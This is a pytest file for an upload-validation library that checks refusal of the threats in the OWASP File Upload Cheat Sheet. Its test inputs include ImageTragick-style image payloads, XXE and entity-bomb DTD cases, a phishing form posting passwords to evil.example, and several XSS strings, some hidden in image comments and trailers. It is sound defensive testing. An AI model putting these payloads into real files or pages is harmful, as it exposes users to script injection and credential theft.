"""OWASP File Upload Cheat Sheet - File Upload Threats.

The threats the cheat sheet opens with, each attempted against the engine and against
every framework.  (Bombs and huge files: see ``test_upload_and_download_limits.py``.)
"""

from __future__ import annotations

import re
import time
from collections.abc import Callable

import pytest
from PIL import Image

from tests.support import corpus
from tests.support.engine import codes
from tests.support.harness import App, file
from uploadshield import Policy, presets

owasp = pytest.mark.owasp
SVG_POLICY = Policy(allowed_types={"image/svg+xml"})


def svg_doctype(dtd: bytes) -> bytes:
    """The DTD as an SVG would carry it: ``<!DOCTYPE svg [...]>``."""
    return re.sub(rb"<!DOCTYPE \w+", b"<!DOCTYPE svg", dtd)


XML_POLICY = Policy(allowed_types={"application/xml"})


@owasp("threat.parser-exploit")
@pytest.mark.parametrize(
    ("data", "name"),
    [
        (corpus.IMAGETRAGICK_MVG, "exploit.jpg"),
        (corpus.IMAGETRAGICK_MVG, "exploit.mvg"),
        (corpus.EPS, "exploit.png"),
        (b"<?xml version='1.0'?><image><read filename='caption:pwned'/></image>", "exploit.png"),
    ],
    ids=["mvg-as-jpg", "mvg", "eps-as-png", "msl-as-png"],
)
def test_imagetragick_style_payloads_never_reach_an_image_library(
    app: App, data: bytes, name: str
) -> None:
    reply = app.post("/avatar", file(name, data, "image/jpeg"))
    assert reply.status == 415, reply.codes


@owasp("threat.parser-exploit")
def test_a_crashing_decoder_is_a_refusal(monkeypatch: pytest.MonkeyPatch) -> None:
    def explode(*args: object, **kwargs: object) -> None:
        raise MemoryError("decoder bug")  # e.g. a heap overflow surfacing in Pillow

    monkeypatch.setattr(Image, "open", explode)
    assert codes(corpus.png(), "a.png", presets.IMAGES) == ("image_corrupt",)


@owasp("threat.parser-exploit", "threat.xml-bomb")
@pytest.mark.parametrize("dtd", [corpus.XXE_DTD, corpus.BILLION_LAUGHS_DTD], ids=["xxe", "lol"])
@pytest.mark.parametrize(
    ("build", "name", "policy", "code"),
    [
        (
            lambda dtd: corpus.svg().replace(b"<svg", svg_doctype(dtd) + b"<svg", 1),
            "a.svg",
            SVG_POLICY,
            "svg_active_content",
        ),
        (corpus.docx_with_dtd, "a.docx", presets.DOCUMENTS, "xml_dtd"),
        (
            lambda dtd: corpus.docx_with_dtd(dtd, "[Content_Types].xml"),
            "a.docx",
            presets.DOCUMENTS,
            "xml_dtd",
        ),
        (corpus.odt_with_dtd, "a.odt", presets.DOCUMENTS, "xml_dtd"),
        (
            lambda dtd: corpus.epub(
                extra={"OEBPS/ch1.xhtml": b'<?xml version="1.0"?>' + dtd + b"<html/>"}
            ),
            "a.epub",
            Policy(allowed_types={"application/epub+zip"}),
            "xml_dtd",
        ),
        (corpus.xml, "a.xml", XML_POLICY, "xml_dtd"),
    ],
    ids=["svg", "docx", "docx-content-types", "odt", "epub", "xml"],
)
def test_xxe_and_entity_bombs_are_refused_without_expanding_anything(
    build: Callable[[bytes], bytes], name: str, policy: Policy, code: str, dtd: bytes
) -> None:
    data = build(dtd)
    started = time.perf_counter()
    assert codes(data, name, policy) == (code,)
    assert time.perf_counter() - started < 1  # nothing was expanded


@owasp("threat.xml-bomb")
@pytest.mark.parametrize(
    "prolog",
    [
        b"\xef\xbb\xbf<?xml version='1.0'?>",  # UTF-8 byte order mark
        b"<?xml version='1.0'?><!-- a comment first -->\n<?pi x?>",  # noise before it
    ],
)
def test_dtds_are_found_behind_byte_order_marks_and_comments(prolog: bytes) -> None:
    data = prolog + corpus.XXE_DTD + b"<r/>"
    assert codes(data, "a.xml", XML_POLICY) == ("xml_dtd",)
    utf16 = (b"<?xml version='1.0' encoding='UTF-16'?>" + corpus.XXE_DTD + b"<r/>").decode()
    assert codes(b"\xff\xfe" + utf16.encode("utf-16-le"), "a.xml", XML_POLICY) == ("xml_dtd",)


@owasp("threat.xml-bomb")
def test_an_overlong_prolog_cannot_hide_a_dtd() -> None:
    padded = b"<?xml version='1.0'?><!--" + b"x" * (100 * 1024) + b"-->" + corpus.XXE_DTD + b"<r/>"
    assert codes(padded, "a.xml", XML_POLICY) == ("xml_dtd",)
    assert codes(corpus.xml(root=b"<r>fine</r>"), "a.xml", XML_POLICY) == ()


@owasp("threat.phishing")
@pytest.mark.parametrize(
    ("data", "name"),
    [
        (
            b"<!DOCTYPE html><form action='https://evil.example'><input name=pw>",
            "invoice.pdf",
        ),
        (corpus.ooxml("docx", extra={"word/vbaProject.bin": b"x"}), "CV.docx"),
        (corpus.pe_executable(), "CV.pdf"),
        (corpus.SHELL_SCRIPT, "notes.txt"),
    ],
    ids=["html-login-form", "macro-cv", "executable-cv", "script"],
)
def test_phishing_payloads_are_refused(app: App, data: bytes, name: str) -> None:
    assert app.post("/documents", file(name, data)).status in (400, 415)


@owasp("threat.client-side")
@pytest.mark.parametrize(
    ("data", "name"),
    [
        (corpus.HTML, "page.txt"),
        (corpus.HTML, "photo.png"),
        (corpus.svg("<script>alert(1)</script>"), "logo.png"),
        (corpus.image("GIF", comment=b"<script>alert(document.domain)</script>"), "a.gif"),
        (corpus.png() + b"<script>alert(1)</script>", "a.png"),
    ],
    ids=["html-as-text", "html-as-png", "svg-as-png", "gif-comment", "png-trailer"],
)
def test_content_that_browsers_would_execute_is_refused(app: App, data: bytes, name: str) -> None:
    assert app.post("/legacy", file(name, data, "image/png")).status in (400, 415)


@owasp("threat.client-side")
@pytest.mark.parametrize(
    "body",
    [
        '<rect onload="alert(1)"/>',
        '<a href="javascript:alert(1)"/>',
        "<foreignObject><body/></foreignObject>",
        '<image href="https://x/y"/>',
        '<a href="&#106;avascript:alert(1)"/>',
    ],
)
def test_active_svg_is_refused_even_where_svg_is_allowed(body: str) -> None:
    assert codes(corpus.svg(body), "a.svg", SVG_POLICY) == ("svg_active_content",)
